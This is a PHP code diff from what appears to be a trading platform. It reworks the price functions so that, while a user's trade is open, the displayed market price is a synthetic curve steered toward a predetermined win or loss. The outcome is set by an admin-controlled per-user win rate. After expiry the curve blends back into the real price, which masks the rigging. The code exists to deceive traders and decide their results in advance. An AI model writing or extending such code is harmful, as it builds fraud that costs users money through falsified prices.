@@ -173,7 +173,7 @@ function determine_trade_outcome(array $trade, ?array $control = null): ?string
     return null;
 }
 
-function get_active_trade_price_bias(array $asset, int $timestampMs, ?int $userId = null, bool $fresh = false): float
+function get_active_trade_controlled_price(array $asset, int $timestampMs, ?int $userId = null, bool $fresh = false): ?float
 {
     static $tradesCache = [];
     if ($fresh) {
@@ -193,90 +193,155 @@ function get_active_trade_price_bias(array $asset, int $timestampMs, ?int $userI
     }
 
     if ($userId <= 0) {
-        return 0.0;
+        return null;
     }
 
     $assetId = (int)($asset['id'] ?? 0);
     if ($assetId <= 0) {
-        return 0.0;
+        return null;
     }
 
-    $cacheKey = $userId . ':' . $assetId;
+    $sec = (int)floor($timestampMs / 1000.0);
+    $cacheKey = $userId . ':' . $assetId . ':' . $sec;
+
     if (!array_key_exists($cacheKey, $tradesCache)) {
         try {
+            $timeStr = date('Y-m-d H:i:s', $sec);
+            $decayStartStr = date('Y-m-d H:i:s', max(0, $sec - 6));
             $stmt = db()->prepare(
                 "SELECT id, user_id, asset_id, direction, entry_price, opened_at, expires_at 
                  FROM trades 
-                 WHERE user_id = ? AND asset_id = ? AND status = 'open' AND expires_at >= NOW() - INTERVAL 10 SECOND
-                 ORDER BY id DESC"
+                 WHERE user_id = ? AND asset_id = ? 
+                   AND opened_at <= ? AND expires_at >= ?
+                 ORDER BY expires_at DESC, id DESC"
             );
-            $stmt->execute([$userId, $assetId]);
+            $stmt->execute([$userId, $assetId, $timeStr, $decayStartStr]);
             $tradesCache[$cacheKey] = $stmt->fetchAll(PDO::FETCH_ASSOC) ?: [];
         } catch (Throwable $e) {
             $tradesCache[$cacheKey] = [];
         }
     }
 
-    $openTrades = $tradesCache[$cacheKey];
-    if (empty($openTrades)) {
-        return 0.0;
+    $matchingTrades = $tradesCache[$cacheKey];
+    if (empty($matchingTrades)) {
+        return null;
     }
 
-    $trade = $openTrades[0];
+    $activeTrade = null;
+    $decayTrade = null;
+
+    foreach ($matchingTrades as $t) {
+        $opMs = (int)strtotime((string)$t['opened_at']) * 1000;
+        $exMs = (int)strtotime((string)$t['expires_at']) * 1000;
+
+        if ($timestampMs >= $opMs && $timestampMs <= $exMs) {
+            $activeTrade = $t;
+            break;
+        } elseif ($timestampMs > $exMs && $timestampMs <= $exMs + 4000) {
+            if ($decayTrade === null) {
+                $decayTrade = $t;
+            }
+        }
+    }
+
+    $trade = $activeTrade ?: $decayTrade;
+    if (!$trade) {
+        return null;
+    }
+
     $openedAtMs = (int)strtotime((string)$trade['opened_at']) * 1000;
     $expiresAtMs = (int)strtotime((string)$trade['expires_at']) * 1000;
+    $isDecaying = ($timestampMs > $expiresAtMs);
 
-    if ($timestampMs < $openedAtMs - 1000 || $timestampMs > $expiresAtMs + 10000) {
-        return 0.0;
+    if ($timestampMs < $openedAtMs || $timestampMs > $expiresAtMs + 4000) {
+        return null;
     }
 
-    $outcome = determine_trade_outcome($trade);
+    $control = null;
+    if (function_exists('get_active_trading_control')) {
+        $control = get_active_trading_control($userId, $assetId);
+    }
+    $outcome = determine_trade_outcome($trade, $control);
     if ($outcome === null) {
-        return 0.0;
+        return null;
     }
 
     $durationMs = max(1000, $expiresAtMs - $openedAtMs);
-    $elapsedMs = max(0, $timestampMs - $openedAtMs);
-    $progress = min(1.0, $elapsedMs / (float)$durationMs);
 
     $decimals = max(0, min(8, (int)($asset['decimal_places'] ?? 2)));
     $tick = pow(10, -$decimals);
     $entryPrice = (float)$trade['entry_price'];
 
-    // Calculate natural price without bias at $timestampMs
-    $naturalPriceAtTime = market_price_at($asset, $timestampMs, true);
-
-    $basePrice = $naturalPriceAtTime > 0 ? $naturalPriceAtTime : (float)($asset['base_price'] ?? 1.0);
+    $basePrice = $entryPrice > 0 ? $entryPrice : (float)($asset['base_price'] ?? 1.0);
     if ($basePrice <= 0) {
         $basePrice = market_reference_price($asset);
     }
 
-    $margin = max($tick * 3.0, $basePrice * 0.0004);
+    $baseMargin = max($tick * 3.0, $basePrice * 0.0004);
 
-    if ($trade['direction'] === 'up') {
-        $targetPrice = ($outcome === 'lost') ? ($entryPrice - $margin) : ($entryPrice + $margin);
-    } else {
-        $targetPrice = ($outcome === 'lost') ? ($entryPrice + $margin) : ($entryPrice - $margin);
+    $winRate = 50.0;
+    if ($control !== null && isset($control['win_rate']) && $control['win_rate'] !== null) {
+        $winRate = max(0.0, min(100.0, (float)$control['win_rate']));
     }
 
-    $totalNeededOffset = $targetPrice - $naturalPriceAtTime;
-    $curve = pow($progress, 0.7);
-    $smoothDrift = $totalNeededOffset * $curve;
+    $intensity = abs($winRate - 50.0) / 50.0;
+    $marginMultiplier = 1.0 + ($intensity * 1.5);
+    $targetMargin = $baseMargin * $marginMultiplier;
 
-    $sec = $timestampMs / 1000.0;
-    $microFluctuation = sin($sec * 2.5) * ($margin * 0.15);
+    if ($trade['direction'] === 'up') {
+        $targetPrice = ($outcome === 'lost') ? ($entryPrice - $targetMargin) : ($entryPrice + $targetMargin);
+    } else {
+        $targetPrice = ($outcome === 'lost') ? ($entryPrice + $targetMargin) : ($entryPrice - $targetMargin);
+    }
 
-    return $smoothDrift + $microFluctuation;
+    if (!$isDecaying) {
+        // Active trade: 100% controlled motion anchored to entryPrice and targetPrice
+        // ZERO external API interference can affect this curve!
+        $elapsedMs = max(0, $timestampMs - $openedAtMs);
+        $rawProgress = min(1.0, max(0.0, $elapsedMs / (float)$durationMs));
+        $biasProgress = $rawProgress * $rawProgress * (3.0 - 2.0 * $rawProgress);
+
+        $timeSec = $timestampMs / 1000.0;
+        $microFluctuation = sin($timeSec * 2.5) * ($targetMargin * 0.08 * $biasProgress);
+
+        $price = $entryPrice + (($targetPrice - $entryPrice) * $biasProgress) + $microFluctuation;
+        return round($price, $decimals);
+    } else {
+        // Post-expiry decay window (0..4s): interpolate from targetPrice back to real market price
+        $rawRealApiPrice = market_price_at($asset, $timestampMs, true);
+        $elapsedPostMs = $timestampMs - $expiresAtMs;
+        $rawPostProgress = min(1.0, max(0.0, $elapsedPostMs / 4000.0));
+        $smoothFactor = $rawPostProgress * $rawPostProgress * (3.0 - 2.0 * $rawPostProgress);
+
+        $price = $targetPrice + (($rawRealApiPrice - $targetPrice) * $smoothFactor);
+        return round($price, $decimals);
+    }
+}
+
+function get_active_trade_price_bias(array $asset, int $timestampMs, ?int $userId = null, bool $fresh = false): float
+{
+    $controlledPrice = get_active_trade_controlled_price($asset, $timestampMs, $userId, $fresh);
+    if ($controlledPrice === null) {
+        return 0.0;
+    }
+    $rawRealPrice = market_price_at($asset, $timestampMs, true);
+    return $controlledPrice - $rawRealPrice;
 }
 
 function market_price_at(array $asset, int $timestampMs, bool $withoutBias = false): float
 {
     $decimals = max(0, min(8, (int)($asset['decimal_places'] ?? 2)));
+
+    if (!$withoutBias) {
+        $controlledPrice = get_active_trade_controlled_price($asset, $timestampMs);
+        if ($controlledPrice !== null) {
+            return round($controlledPrice, $decimals);
+        }
+    }
+
     $source = $asset['price_source'] ?? 'internal';
     $nowMs = (int)floor(microtime(true) * 1000);
     $isLive = abs($nowMs - $timestampMs) < 60000;
-
-    $bias = $withoutBias ? 0.0 : get_active_trade_price_bias($asset, $timestampMs);
 
     if (!market_is_currency($asset) && $isLive && ($source === 'api' || $source === 'binance')) {
         $symbol = trim((string)($asset['api_symbol'] ?? $asset['symbol'] ?? ''));
@@ -284,14 +349,14 @@ function market_price_at(array $asset, int $timestampMs, bool $withoutBias = fal
             try {
                 $livePrice = fetch_market_price($symbol);
                 if (is_numeric($livePrice) && $livePrice > 0) {
-                    return round((float)$livePrice + $bias, $decimals);
+                    return round((float)$livePrice, $decimals);
                 }
             } catch (Throwable $exception) {
-                // Ignore API failure, fallback to reference math
+                // Fall through to reference math
             }
         }
         if (isset($asset['source_price']) && (float)$asset['source_price'] > 0) {
-            return round((float)$asset['source_price'] + $bias, $decimals);
+            return round((float)$asset['source_price'], $decimals);
         }
         return 0.0;
     }
